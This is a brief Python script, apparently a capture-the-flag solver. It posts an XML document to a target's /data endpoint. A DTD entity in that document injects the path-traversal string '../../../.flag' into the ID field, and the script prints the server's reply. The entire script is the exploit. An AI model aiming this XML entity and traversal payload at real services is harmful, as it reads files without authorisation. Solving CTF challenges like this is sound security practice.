import sys

import requests

ip = sys.argv[1]
port = sys.argv[2]

url = f'http://{ip}:{port}/data'
xml_data = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY toreplace "../../../.flag"> ]>
<data><ID>&toreplace;</ID></data>'''

headers = {
    'Host': f'{ip}:{port}',
    'Content-Length': str(len(xml_data)),
    'Accept-Language': 'en-US',
    'User-Agent': 'solver',
    'Content-Type': 'application/xml',
    'Accept': '*/*',
    'Origin': f'http://{ip}:{port}',
    'Referer': f'http://{ip}:{port}/smith',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

response = requests.post(url, data=xml_data, headers=headers)

print(response.text)
